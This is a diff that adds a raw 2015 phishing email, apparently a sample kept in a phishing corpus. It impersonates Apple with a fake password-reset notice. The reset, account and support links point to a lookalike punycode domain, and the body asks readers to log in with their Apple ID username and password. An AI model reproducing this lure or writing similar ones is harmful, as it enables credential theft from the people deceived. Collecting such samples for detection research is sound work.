@@ -1,0 +1,67 @@
+Return-Path: <enable1@b2b2c.ca>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 54B4CF4161
+	for <jose@login.monkey.org>; Thu, 30 Jul 2015 11:44:51 -0500 (CDT)
+Received: from smtpin13.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay02.b.hostedemail.com (Postfix) with SMTP id 07D6627AB4F
+	for <jose@login.monkey.org>; Thu, 30 Jul 2015 16:44:51 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70465498782.13.shock03_6470b9c80a341
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 72,2,0,54ee421b727637d5,d41d8cd98f00b204,enable1@b2b2c.ca,:,RULES_HIT:41:72:355:375:379:543:800:967:973:978:983:988:989:1147:1208:1224:1252:1256:1260:1311:1313:1314:1345:1431:1432:1433:1434:1437:1515:1516:1517:1534:1543:1571:1686:1699:1711:1714:1719:1730:1747:1777:1792:2194:2198:2199:2200:2393:2525:2527:2538:2539:2568:2628:2682:2685:2691:2693:2859:2890:2891:2902:2910:2913:2918:2924:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3148:3351:3586:3804:3865:3867:3868:3870:3871:3872:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4552:5007:6261:7903:8568:8957:9025:9388:9908:10004:10044:10049:10346:10400:10798:11658:12956:12958:13139:14250,0,RBL:58.28.4.122:@b2b2c.ca:.lbl8.mailshell.net-62.16.180.75 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fu,MSBL:0,DNSBL:xn--11bv1bfkd8grab5ixa.com-dnsbl7.mailshell.net-127.0.0.192,Custom_rules:0:0:0
+X-HE-Tag: shock03_6470b9c80a341
+X-Filterd-Recvd-Size: 4491
+Received: from ananke.wxnz.net (ananke.wxnz.net [58.28.4.122])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu, 30 Jul 2015 16:44:50 +0000 (UTC)
+Received: from adam-nvr (ip-118-90-43-92.xdsl.xnet.co.nz [118.90.43.92])
+	by ananke.wxnz.net (Postfix) with ESMTP id 4BB3D172674
+	for <jose@monkey.org>; Fri, 31 Jul 2015 04:44:45 +1200 (NZST)
+Message-ID: <025a2eac-42216-cc3c1976741898@adam-nvr>
+From: "Apple" <Enable1@b2b2c.ca>
+To: jose@monkey.org
+Subject: Validating your Apple ID.
+Date: Fri, 31 Jul 2015 04:43:39 +1200
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+X-Priority: 3
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 138
+
+
+<div style="background-color:#fff">
+<div dir="ltr">
+<div>
+<div style="width:95%;text-align:right;padding-top:6%;padding-bottom:6%">
+<img src="https://ci5.googleusercontent.com/proxy/qcsj1RdzjOQeNBFuJNPulh5jNavrAhujjSwrEiURQgwmQWH_kyolJFEMjOfifs9dBRzTOzSgglfslIo8voFjv8WT-k2e2UejLtaRHbUyBNUdfrJzfeOIPHqTyqI=s0-d-e1-ft#https://statici.icloud.com/emailimages/v4/common/apple_logo_web@2x.png" style="display:inline-block;min-height:28px;width:24px">
+</div>
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+<tbody><tr><td style="padding: 0pt 5% 18px; font: 300 14px/18px 'Lucida Grande',Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif; color: rgb(51, 51, 51);"> </td></tr>
+<tr><td style="padding: 0pt 5% 18px; font: 300 14px/18px 'Lucida Grande',Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif; color: rgb(51, 51, 51);">
+You recently initiated a password reset for your Apple ID. To complete the process, click the link below and log in using your username and password.
+</td></tr><tr><td style="padding: 0pt 5% 18px; font: 300 14px/18px 'Lucida Grande',Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif; color: rgb(51, 51, 51);"><a href="http://xn--11bv1bfkd8grab5ixa.com/pl/" role="link" target="_blank" rel="noreferrer">Reset now &gt;</a>
+</td></tr><tr><td style="padding: 0pt 5% 18px; font: 300 14px/18px 'Lucida Grande',Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif; color: rgb(51, 51, 51);"> This link will expire three hours after this email was sent. </td></tr>
+<tr><td style="padding: 0pt 5% 18px; font: 300 14px/18px 'Lucida Grande',Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif; color: rgb(51, 51, 51);">If you didn’t make this request, it's likely that another user has entered your email address by mistake and your account is still secure. If you believe an unauthorized person has accessed your account, you can reset your password at <a href="http://xn--11bv1bfkd8grab5ixa.com/pl/" role="link" target="_blank" rel="noreferrer">My Apple ID</a>.
+
+</td></tr><tr><td style="padding: 18px 5% 51px; font: 300 14px/18px 'Lucida Grande',Lucida Sans,Lucida Sans Unicode,sans-serif,Arial,Helvetica,Verdana,sans-serif;">Apple Support</td></tr>
+</tbody></table>
+</td>
+</tr>
+</tbody></table>
+<u></u>
+<div></div>
+<table style="width: 100%;" border="0" cellpadding="0" cellspacing="0">
+<tbody><tr><td><div style="min-height: 1px;" height="1"></div></td></tr>
+<tr><td style="width: 100%;"><img src="https://ci3.googleusercontent.com/proxy/BskpQQOswEcEktlcWHTJ1GXqrB9aFVLijUYlXi-wmYLZuNmb9EXeeReH-d3DFfp9dXd7-ZKXAP0d6pmDLqyZut7X3x5SOIxKAHPOuFAkp08FDquIHn0r_kfgoizesg=s0-d-e1-ft#https://statici.icloud.com/emailimages/v4/common/footer_gradient_web.png" style="display: block; width: 100%;" height="16"></td></tr>
+<tr><td style="padding: 0pt; text-align: center; font: 11px/15px Geneva,Verdana,Arial,Helvetica,sans-serif; color: rgb(136, 136, 136);"><a href="https://www.google.com/url?q=https%3A%2F%2Fappleid.apple.com%2Fchoose-your-country&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHVHSdy75rpkmu2wikHSJTVmdp_Sw" role="link" target="_blank" rel="noreferrer">My Apple ID</a> | <a href="http://xn--11bv1bfkd8grab5ixa.com/pl/" role="link" target="_blank" rel="noreferrer">Support</a> | <a href="https://www.google.com/url?q=https%3A%2F%2Fwww.apple.com%2Flegal%2Finternet-services%2Fprivacy%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNE00ZA9DQBe3vpiwcZurakEn_chIQ" role="link" target="_blank" rel="noreferrer">Privacy Policy</a></td></tr>
+
+<tr><td style="padding: 0pt; margin-bottom: 0pt; text-align: center; font: 11px/15px Geneva,Verdana,Arial,Helvetica,sans-serif; color: rgb(136, 136, 136);">Copyright © 2015 <span dir="ltr">Apple</span> <span>All Rights Reserved.</span>
